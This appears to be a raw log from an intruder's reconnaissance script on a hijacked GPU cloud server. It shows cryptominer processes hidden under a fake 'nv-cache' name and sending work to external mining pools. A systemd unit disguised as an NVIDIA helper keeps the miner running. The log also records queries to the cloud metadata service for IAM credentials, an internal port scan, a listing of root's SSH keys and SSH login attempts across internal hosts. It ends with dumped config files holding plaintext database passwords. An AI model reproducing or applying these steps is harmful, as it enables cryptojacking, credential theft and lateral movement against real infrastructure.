@@ -1,0 +1,299 @@
+Warning: Permanently added '123.184.7.135' (ED25519) to the list of known hosts.
+### START3 2026-11-24T19:50:06Z
+### MINER-ARGV
+PID 1535944
+/usr/local/lib/nv-cache/.bd --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz/ul-t2-123-184-7-135-g0 --password x -d 0 --api-port 1270 
+PID 1536119
+/usr/local/lib/nv-cache/.bd --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz/ul-t2-123-184-7-135-g1 --password x -d 1 --api-port 1271 
+PID 1536277
+/usr/local/lib/nv-cache/.bd --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz/ul-t2-123-184-7-135-g2 --password x -d 2 --api-port 1272 
+PID 1536391
+/usr/local/lib/nv-cache/.bd --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz/ul-t2-123-184-7-135-g3 --password x -d 3 --api-port 1273 
+PID 1536495
+/usr/local/lib/nv-cache/.bd --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz/ul-t2-123-184-7-135-g4 --password x -d 4 --api-port 1274 
+PID 1536620
+/usr/local/lib/nv-cache/.bd --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz/ul-t2-123-184-7-135-g5 --password x -d 5 --api-port 1275 
+PID 1536726
+/usr/local/lib/nv-cache/.bd --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz/ul-t2-123-184-7-135-g6 --password x -d 6 --api-port 1276 
+PID 1536908
+/usr/local/lib/nv-cache/.bd --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz/ul-t2-123-184-7-135-g7 --password x -d 7 --api-port 1277 
+### MINER-UNIT
+# /etc/systemd/system/nv-cuda-cache.service
+[Unit]
+Description=nv cuda cache helper
+After=network-online.target
+[Service]
+Type=simple
+ExecStart=/bin/sh /root/.k/keep.sh /root/.k ul-t2-123-184-7-135-g0 prl-sg.kryptex.network:7048
+Restart=always
+RestartSec=30
+Nice=19
+[Install]
+WantedBy=multi-user.target
+### CGROOT
+0::/init.scope
+### IMDS-FULL
+-- http://169.254.169.254/latest/meta-data/
+ami-launch-index
+ami-manifest-path
+azone
+bbc-disk-mapping/
+block-device-location/
+block-device-mapping/
+block-device-type/
+create-time
+hostname
+image-id
+instance-action
+instance-id
+instance-name
+instance-shortid
+instance-specs
+instance-type
+instance-type-ex
+ipv6-address
+ipv6-gateway
+ipv6-prefixlen
+local-hostname
+local-ipv4
+memory-frequency/
+network/
+placement/
+public-hostname
+public-ipv4
+region
+reservation-id
+security-groups
+serial-number
+subnet-id
+user_id
+vpc-id
+-- http://169.254.169.254/latest/meta-data/iam/
+<html>
+ <head>
+  <title>404 Not Found</title>
+ </head>
+ <body>
+  <h1>404 Not Found</h1>
+  The resource could not be found.<br /><br />
+
+
+
+ </body>
+</html>
+-- http://169.254.169.254/latest/meta-data/iam/security-credentials/
+<html>
+ <head>
+  <title>404 Not Found</title>
+ </head>
+ <body>
+  <h1>404 Not Found</h1>
+  The resource could not be found.<br /><br />
+
+
+
+ </body>
+</html>
+-- http://169.254.169.254/latest/meta-data/instance-name
+bingxing_4_19_2tai_2
+-- http://169.254.169.254/latest/meta-data/azone
+zoneA
+-- http://169.254.169.254/latest/meta-data/hostname
+instance-az1t0vf3-1
+-- http://169.254.169.254/latest/meta-data/domain
+<html>
+ <head>
+  <title>404 Not Found</title>
+ </head>
+ <body>
+  <h1>404 Not Found</h1>
+  The resource could not be found.<br /><br />
+
+
+
+ </body>
+</html>
+-- http://169.254.169.254/latest/meta-data/instance-type
+GPU-HPC-8VX8
+-- http://169.254.169.254/latest/user-data
+<html>
+ <head>
+  <title>404 Not Found</title>
+ </head>
+ <body>
+  <h1>404 Not Found</h1>
+  The resource could not be found.<br /><br />
+
+
+
+ </body>
+</html>
+-- http://169.254.169.254/latest/meta-data/public-keys/
+<html>
+ <head>
+  <title>404 Not Found</title>
+ </head>
+ <body>
+  <h1>404 Not Found</h1>
+  The resource could not be found.<br /><br />
+
+
+
+ </body>
+</html>
+-- openstack meta_data.json
+{"random_seed": "pb+QIOzKzucYdUOphw6kgkMip2Yh5hxW0WFRbCcifjhUoorLBmRUCNA132WBwfbmU2XMddL+cEsHv/wZahHP7tbcF1+n0rZASDr070/S1vKcmIictG/k/9/GztMoDUYvpRlfkt6aIBrtkCVoQPbigzMyY5msYGf5VzZTV4OWjx63Wgt2PoKHXueyHcJZv8qcCSn6paS6X3xJrwjkYDnQyW8HV5ngGDHJVMWPmT6UZwQH67tozexE/VNPj25uKksVSqgzzz1qN5vYYgBQS0GTfKLmLMDDOLKnHwAu6QL/2sqwboO1uYXXgubp0Lvlb5N6wLEtajp+e00eOYMv2YduupbIUkZj8BmhmODcE/xKMIa712YgQIUjHj0V9YUl+l67UmJwV0EqddCsd1ENekl43m+XbrUVpe3c3s0JaHUljfAQaRHNeJl33kOhdo6klKzb5GR5mT+ouzx1DTl/fTI+YTT5X7j4DuDZr5CsE+1dQQ+YMpt+PyYY6QsrTHe9PuGAITKaVdlov4LZcjWDdswE+wUqJO7OJffjsASSfMtNfGfhIaIiF5iG9oEFcf7OxGIxvHCkH0nNVPIw7jYPFiPfrtx1hlhrLd1s1Fj+Cz+PAm99sx3mxbRxfdygqSfP7mwQsvU/moIiF84IPyVtiu/CvkgVXm5vK+V0/nuzeiZng34=", "uuid": "18f5adda-6d6f-45db-a7a4-117faf33a8da", "availability_zone": "zoneA", "hostname": "instance-az1t0vf3-1", "launch_index": 0, "meta": {"admin_pass": "", "root_on_cds_v2": "True", "tor_name": "SYHGD121-03-02-45-IB-S6850-138.Int", "short_vpc_id": "vpc-utf2xy0fi6fg", "azone": "zoneA", "source": "console", "payment": "postpay", "short_image_id": "m-YTrRqXWl", "is_internal_user": "0", "ephemeral_raw": "true", "enable_disk_iops": "false", "short_subnet_id": "sbn-us0tvp3x5zfm", "key": "bbc1", "use_vhost_as_emulator": "false", "ssh-keys": "", "region": "cnsy"}, "name": "bingxing_4_19_2tai_2"}
+-- openstack user_data
+
+### PEER-PORTS
+OPENP 192.168.0.20 22
+OPENP 192.168.0.21 22
+OPENP 192.168.0.22 22
+OPENP 192.168.0.23 22
+OPENP 192.168.0.23 80
+OPENP 192.168.0.23 443
+OPENP 192.168.0.23 9000
+OPENP 192.168.0.23 3306
+OPENP 192.168.0.23 6379
+OPENP 192.168.0.24 9400
+OPENP 192.168.0.28 22
+OPENP 192.168.0.28 9400
+OPENP 192.168.0.30 22
+OPENP 192.168.0.30 9400
+OPENP 192.168.0.31 22
+OPENP 192.168.0.31 9400
+### DCGM
+-- dcgm 192.168.0.24
+DCGM_FI_DEV_GPU_UTIL{gpu="0",UUID="GPU-5bb91679-0fee-d751-9cf7-5dc4538daf55",pci_bus_id="00000000:4B:00.0",device="nvidia0",modelName="NVIDIA A800-SXM4-80GB",Hostname="vcc-worker01",DCGM_FI_DRIVER_VERSION="590.48.01"} 100
+DCGM_FI_DEV_GPU_UTIL{gpu="1",UUID="GPU-fd4b42ac-0343-7e3a-f29c-60ed1eb0e85e",pci_bus_id="00000000:51:00.0",device="nvidia1",modelName="NVIDIA A800-SXM4-80GB",Hostname="vcc-worker01",DCGM_FI_DRIVER_VERSION="590.48.01"} 100
+DCGM_FI_DEV_GPU_UTIL{gpu="2",UUID="GPU-12950526-331a-9117-715a-193337353110",pci_bus_id="00000000:6A:00.0",device="nvidia2",modelName="NVIDIA A800-SXM4-80GB",Hostname="vcc-worker01",DCGM_FI_DRIVER_VERSION="590.48.01"} 100
+modelName="NVIDIA A800-SXM4-80GB"
+8
+-- dcgm 192.168.0.28
+DCGM_FI_DEV_GPU_UTIL{gpu="0",UUID="GPU-a0460025-ec81-029d-9122-f9d0f912632b",pci_bus_id="00000000:4B:00.0",device="nvidia0",modelName="NVIDIA A800-SXM4-80GB",Hostname="vcc-worker02",DCGM_FI_DRIVER_VERSION="590.48.01"} 0
+DCGM_FI_DEV_GPU_UTIL{gpu="1",UUID="GPU-2166f688-cff4-d8ec-9c90-bf7fd3a78163",pci_bus_id="00000000:51:00.0",device="nvidia1",modelName="NVIDIA A800-SXM4-80GB",Hostname="vcc-worker02",DCGM_FI_DRIVER_VERSION="590.48.01"} 0
+DCGM_FI_DEV_GPU_UTIL{gpu="2",UUID="GPU-586fadaa-12f4-0c1b-498e-11df04f2234a",pci_bus_id="00000000:6A:00.0",device="nvidia2",modelName="NVIDIA A800-SXM4-80GB",Hostname="vcc-worker02",DCGM_FI_DRIVER_VERSION="590.48.01"} 87
+modelName="NVIDIA A800-SXM4-80GB"
+8
+-- dcgm 192.168.0.30
+DCGM_FI_DEV_GPU_UTIL{gpu="0",UUID="GPU-847c9a99-8751-5b50-6c8d-21f8366170de",pci_bus_id="00000000:4B:00.0",device="nvidia0",modelName="NVIDIA A800-SXM4-80GB",Hostname="vcc-worker03",DCGM_FI_DRIVER_VERSION="590.48.01"} 0
+DCGM_FI_DEV_GPU_UTIL{gpu="1",UUID="GPU-f820fb00-457e-9b6c-6b63-5d53cf2ffb1a",pci_bus_id="00000000:51:00.0",device="nvidia1",modelName="NVIDIA A800-SXM4-80GB",Hostname="vcc-worker03",DCGM_FI_DRIVER_VERSION="590.48.01"} 0
+DCGM_FI_DEV_GPU_UTIL{gpu="2",UUID="GPU-3d7c3c55-55e3-53b6-a75d-fa061010b371",pci_bus_id="00000000:6A:00.0",device="nvidia2",modelName="NVIDIA A800-SXM4-80GB",Hostname="vcc-worker03",DCGM_FI_DRIVER_VERSION="590.48.01"} 0
+modelName="NVIDIA A800-SXM4-80GB"
+8
+-- dcgm 192.168.0.31
+DCGM_FI_DEV_GPU_UTIL{gpu="0",UUID="GPU-8da5563c-b0c5-35a9-a79d-1fd68c7376e2",pci_bus_id="00000000:4B:00.0",device="nvidia0",modelName="NVIDIA A800-SXM4-80GB",Hostname="vcc-worker04",DCGM_FI_DRIVER_VERSION="590.48.01"} 0
+DCGM_FI_DEV_GPU_UTIL{gpu="1",UUID="GPU-d0116d95-daf6-78aa-563c-eb9151c31b79",pci_bus_id="00000000:51:00.0",device="nvidia1",modelName="NVIDIA A800-SXM4-80GB",Hostname="vcc-worker04",DCGM_FI_DRIVER_VERSION="590.48.01"} 0
+DCGM_FI_DEV_GPU_UTIL{gpu="2",UUID="GPU-cc3637ad-1151-5a94-7f58-3225254820e5",pci_bus_id="00000000:6A:00.0",device="nvidia2",modelName="NVIDIA A800-SXM4-80GB",Hostname="vcc-worker04",DCGM_FI_DRIVER_VERSION="590.48.01"} 0
+modelName="NVIDIA A800-SXM4-80GB"
+8
+-- dcgm 192.168.0.20
+0
+-- dcgm 192.168.0.21
+0
+-- dcgm 192.168.0.22
+0
+### KEYS-REAL
+total 24
+drwx------  2 root root 4096 Sep  3 17:03 .
+drwx------ 35 root root 4096 Nov 25 03:42 ..
+-rw-------  1 root root 4032 Nov 24 09:56 authorized_keys
+-rw-------  1 root root 2590 Apr 18  2026 id_rsa
+-rw-r--r--  1 root root  564 Apr 18  2026 id_rsa.pub
+-rw-r--r--  1 root root 1846 Nov 25 02:03 known_hosts
+### LADDER3
+  miss root@192.168.0.20 rc=255 Warning: Permanently added '192.168.0.20' (ED25519) to the list of known hosts. root@192.168.0.20: Permission denied (p
+  miss ubuntu@192.168.0.20 rc=255 Warning: Permanently added '192.168.0.20' (ED25519) to the list of known hosts. ubuntu@192.168.0.20: Permission denied 
+  miss kgzs@192.168.0.20 rc=255 Warning: Permanently added '192.168.0.20' (ED25519) to the list of known hosts. kgzs@192.168.0.20: Permission denied (p
+  miss para@192.168.0.20 rc=255 Warning: Permanently added '192.168.0.20' (ED25519) to the list of known hosts. para@192.168.0.20: Permission denied (p
+  miss admin@192.168.0.20 rc=255 Warning: Permanently added '192.168.0.20' (ED25519) to the list of known hosts. admin@192.168.0.20: Permission denied (
+  miss root@192.168.0.21 rc=255 Warning: Permanently added '192.168.0.21' (ED25519) to the list of known hosts. root@192.168.0.21: Permission denied (p
+  miss ubuntu@192.168.0.21 rc=255 Warning: Permanently added '192.168.0.21' (ED25519) to the list of known hosts. ubuntu@192.168.0.21: Permission denied 
+  miss kgzs@192.168.0.21 rc=255 Warning: Permanently added '192.168.0.21' (ED25519) to the list of known hosts. kgzs@192.168.0.21: Permission denied (p
+  miss para@192.168.0.21 rc=255 Warning: Permanently added '192.168.0.21' (ED25519) to the list of known hosts. para@192.168.0.21: Permission denied (p
+  miss admin@192.168.0.21 rc=255 Warning: Permanently added '192.168.0.21' (ED25519) to the list of known hosts. admin@192.168.0.21: Permission denied (
+  miss root@192.168.0.22 rc=255 Warning: Permanently added '192.168.0.22' (ED25519) to the list of known hosts. root@192.168.0.22: Permission denied (p
+  miss ubuntu@192.168.0.22 rc=255 Warning: Permanently added '192.168.0.22' (ED25519) to the list of known hosts. ubuntu@192.168.0.22: Permission denied 
+  miss kgzs@192.168.0.22 rc=255 Warning: Permanently added '192.168.0.22' (ED25519) to the list of known hosts. kgzs@192.168.0.22: Permission denied (p
+  miss para@192.168.0.22 rc=255 Warning: Permanently added '192.168.0.22' (ED25519) to the list of known hosts. para@192.168.0.22: Permission denied (p
+  miss admin@192.168.0.22 rc=255 Warning: Permanently added '192.168.0.22' (ED25519) to the list of known hosts. admin@192.168.0.22: Permission denied (
+  miss root@192.168.0.24 rc=255 ssh: connect to host 192.168.0.24 port 22: Connection refused 
+  miss ubuntu@192.168.0.24 rc=255 ssh: connect to host 192.168.0.24 port 22: Connection refused 
+  miss kgzs@192.168.0.24 rc=255 ssh: connect to host 192.168.0.24 port 22: Connection refused 
+  miss para@192.168.0.24 rc=255 ssh: connect to host 192.168.0.24 port 22: Connection refused 
+  miss admin@192.168.0.24 rc=255 ssh: connect to host 192.168.0.24 port 22: Connection refused 
+  miss root@192.168.0.28 rc=255 Warning: Permanently added '192.168.0.28' (ED25519) to the list of known hosts. root@192.168.0.28: Permission denied (p
+  miss ubuntu@192.168.0.28 rc=255 Warning: Permanently added '192.168.0.28' (ED25519) to the list of known hosts. ubuntu@192.168.0.28: Permission denied 
+  miss kgzs@192.168.0.28 rc=255 Warning: Permanently added '192.168.0.28' (ED25519) to the list of known hosts. kgzs@192.168.0.28: Permission denied (p
+  miss para@192.168.0.28 rc=255 Warning: Permanently added '192.168.0.28' (ED25519) to the list of known hosts. para@192.168.0.28: Permission denied (p
+  miss admin@192.168.0.28 rc=255 Warning: Permanently added '192.168.0.28' (ED25519) to the list of known hosts. admin@192.168.0.28: Permission denied (
+  miss root@192.168.0.30 rc=255 Warning: Permanently added '192.168.0.30' (ED25519) to the list of known hosts. root@192.168.0.30: Permission denied (p
+  miss ubuntu@192.168.0.30 rc=255 Warning: Permanently added '192.168.0.30' (ED25519) to the list of known hosts. ubuntu@192.168.0.30: Permission denied 
+  miss kgzs@192.168.0.30 rc=255 Warning: Permanently added '192.168.0.30' (ED25519) to the list of known hosts. kgzs@192.168.0.30: Permission denied (p
+  miss para@192.168.0.30 rc=255 Warning: Permanently added '192.168.0.30' (ED25519) to the list of known hosts. para@192.168.0.30: Permission denied (p
+  miss admin@192.168.0.30 rc=255 Warning: Permanently added '192.168.0.30' (ED25519) to the list of known hosts. admin@192.168.0.30: Permission denied (
+  miss root@192.168.0.31 rc=255 Warning: Permanently added '192.168.0.31' (ED25519) to the list of known hosts. root@192.168.0.31: Permission denied (p
+  miss ubuntu@192.168.0.31 rc=255 Warning: Permanently added '192.168.0.31' (ED25519) to the list of known hosts. ubuntu@192.168.0.31: Permission denied 
+  miss kgzs@192.168.0.31 rc=255 Warning: Permanently added '192.168.0.31' (ED25519) to the list of known hosts. kgzs@192.168.0.31: Permission denied (p
+  miss para@192.168.0.31 rc=255 Warning: Permanently added '192.168.0.31' (ED25519) to the list of known hosts. para@192.168.0.31: Permission denied (p
+  miss admin@192.168.0.31 rc=255 Warning: Permanently added '192.168.0.31' (ED25519) to the list of known hosts. admin@192.168.0.31: Permission denied (
+### ACCEPT3
+### VENDOR-ENV
+===== /ssd/vendors/QD_ZRYY/ow_customer/.env
+DOC_ENGINE=${DOC_ENGINE:-elasticsearch}
+
+DEVICE=${DEVICE:-cpu}
+
+COMPOSE_PROFILES=${DOC_ENGINE},${DEVICE}
+
+STACK_VERSION=8.11.3
+
+ES_HOST=npa-es
+
+ES_PORT=9200
+
+ELASTIC_PASSWORD=infini_rag_flow
+
+OS_HOST=opensearch01
+
+OS_PORT=11201
+
+OS_HOST=opensearch01
+
+OPENSEARCH_PASSWORD=infini_rag_flow_OS_01
+
+KIBANA_PORT=6601
+
+MEM_LIMIT=8073741824
+
+INFINITY_HOST=infinity
+
+INFINITY_THRIFT_PORT=23817
+INFINITY_HTTP_PORT=23820
+INFINITY_PSQL_PORT=5432
+
+OCEANBASE_HOST=oceanbase
+OCEANBASE_PORT=2881
+OCEANBASE_USER=root@ragflow
+OCEANBASE_PASSWORD=infini_rag_flow
+OCEANBASE_DOC_DBNAME=ragflow_doc
+
+OB_CLUSTER_NAME=${OB_CLUSTER_NAME:-ragflow}
+OB_TENANT_NAME=${OB_TENANT_NAME:-ragflow}
+===== /ssd/vendors/QD_GLAD/npa_bicm_bak/mysql_conf/my.cnf
+[mysqld]
+default-time-zone='+08:00'
+
+server-id=1
+log-bin=/var/lib/mysql/mysql-bin
+binlog-format=ROW
+binlog_expire_logs_seconds=2592000  # 30天
+max_binlog_size=100M
+
+innodb_buffer_pool_size=512M
+innodb_log_file_size=256M
+### ETCD-REDIS
+
+
+timeout: failed to run command ‘redis-cli’: No such file or directory
+### DONE3 2026-11-24T19:50:46Z
